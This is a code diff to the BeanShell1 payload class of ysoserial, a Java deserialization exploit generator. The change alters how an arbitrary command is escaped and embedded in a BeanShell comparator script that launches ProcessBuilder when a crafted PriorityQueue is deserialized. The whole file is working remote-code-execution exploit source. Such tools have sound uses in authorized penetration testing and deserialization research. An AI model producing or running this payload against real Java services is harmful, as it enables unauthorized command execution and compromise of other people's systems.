@@ -5,8 +5,12 @@ import bsh.XThis;
 
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
+import java.util.Arrays;
 import java.util.Comparator;
 import java.util.PriorityQueue;
+
+import ysoserial.Strings;
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.util.Reflections;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.PayloadRunner;
@@ -17,11 +21,18 @@ import ysoserial.payloads.util.PayloadRunner;
 
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({ "org.beanshell:bsh:2.0b5" })
+@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
 public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
- 
+
     public PriorityQueue getObject(String command) throws Exception {
 	// BeanShell payload
-	String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"" + command + "\"}).start();return new Integer(1);}";
+
+        String payload =
+            "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
+                Strings.join( // does not support spaces in quotes
+                    Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
+                    ",", "\"", "\"") +
+                "}).start();return new Integer(1);}";
 
 	// Create Interpreter
 	Interpreter i = new Interpreter();
@@ -44,7 +55,7 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
 
 	return priorityQueue;
     }
- 
+
     public static void main(final String[] args) throws Exception {
 	PayloadRunner.run(BeanShell1.class, args);
     }
